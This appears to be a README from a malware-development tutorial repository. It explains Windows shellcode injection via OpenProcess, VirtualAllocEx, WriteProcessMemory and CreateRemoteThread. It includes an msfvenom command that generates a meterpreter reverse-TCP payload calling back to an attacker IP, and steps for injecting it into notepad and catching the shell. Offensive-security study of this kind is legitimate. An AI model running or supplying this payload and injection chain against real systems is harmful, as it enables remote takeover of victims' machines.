## `💉` Shellcode Injection

This technique is as vanilla as it gets; the simplest. It's also *quite* elegant. By attaching to an existing process, we're able to inject our own shellcode into it and have our shellcode run. A bit of an oversimplification since there's actually a lot going on under the covers; but we'll talk about that next. We're going to be using a lot of **Win32 API** calls for our malware development until we get more advanced in our craft. I've created another repo called [low-level](https://github.com/cr-0w/low-level) that also documents my experience with low-level languages including: `Assembly`, `C`, `C++`, `Win32 API`, etc. You could take a gander at it before coming here in case you're brand-brand new.

A shellcode injection consists of the following API calls:

- `OpenProcess()`
- `VirtualAllocEx()`
- `WriteProcessMemory()`
- `CreateRemoteThread()`

> **Note**:
> *All of the documentation for these functions, as well as the Win32 API can be found/read from [Microsoft themselves](https://learn.microsoft.com/en-us/windows/win32/apiindex/windows-api-list). It's an amazing resource; although it may seem extremely daunting at first. However, I promise that if you take the time to actually read it - as well as read the related documents that use your function, you'll come to appreciate this resource.*

## `💽` Demo

https://user-images.githubusercontent.com/59679082/220434097-27645ac4-c8a8-4679-bee8-f5ec277853a0.mp4

## `⚠️` Malicious Shellcode Example

> **Warning**:
> *The final code, isn't exactly a super-vanilla implementation of this technique. I included my code from the [process enumeration](https://github.com/cr-0w/low-level/tree/main/Win32%20API/5-enumerateprocess) part of my [low-level](https://github.com/cr-0w/low-level) repository. I thought it would be a neat little way of combining some concepts.*

In this example, I opted to go for harmless shellcode, which just pops-a-calc. You could definitely swap out your shellcode for something like a meterpreter shell or something. If I can help it, I'll try to opt for the less-malicious shellcode as a PoC. However, since this is our *first* time doing this, why not be a little extra? 😊

First, let's generate some shellcode with `msfvenom`. We'll try to get a simple meterpreter reverse shell going. 

```bash
cr0w@blackbird: ~
ζ ›› msfvenom --platform windows --arch x64 -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.198.128 LPORT=443 exitfunc=thread -b "\x00" -f c
```

![image](https://user-images.githubusercontent.com/59679082/220697432-372ce7ba-21d6-406f-b85a-9fde69b94130.png)

> **Note**:
> *Obviously, this would IMMEDIATELY get flagged by pretty much any AV/EDR; so, if you're planning on running this in a patched environment, good luck.*


With the shellcode now generated, we can include it in our script.

```cpp
unsigned char buf[] = ""; // SHELLCODE HERE
```

![image](https://user-images.githubusercontent.com/59679082/220699108-2a9717cb-eda9-465b-8e87-7ca8534ccafe.png)

Nice, our script is now *locked and loaded*. Let's compile it, and get our `exploit/multi/handler` ready to catch the shell. 

![image](https://user-images.githubusercontent.com/59679082/220700137-31a60641-0aa3-4fd9-bc35-4d115d8c5edd.png)

Finally, we can now use our executable to see if we catch a shell. Let's see how it goes:

https://user-images.githubusercontent.com/59679082/220713806-f2b4d399-f045-4699-805a-c4da7c7c930e.mp4

We can also inspect the notepad process after getting a shell. We can see that it gets a new DLL that it should otherwise never have. `ws2_32.dll` which is responsible for sockets.

![image](https://user-images.githubusercontent.com/59679082/220707821-832d13fc-99ad-422f-80a4-b1a5a5f935e7.png)



## `💖` Extra Resources

Some other resources you can use to read up on this technique are:

- [CreateRemoteThread Shellcode Injection](https://www.ired.team/offensive-security/code-injection-process-injection/process-injection)
- [Process Injection using CreateRemoteThread API](https://tbhaxor.com/createremotethread-process-injection/)
- [Process Injection: Remote Thread Injection or CreateRemoteThread](https://aliongreen.github.io/posts/remote-thread-injection.html)
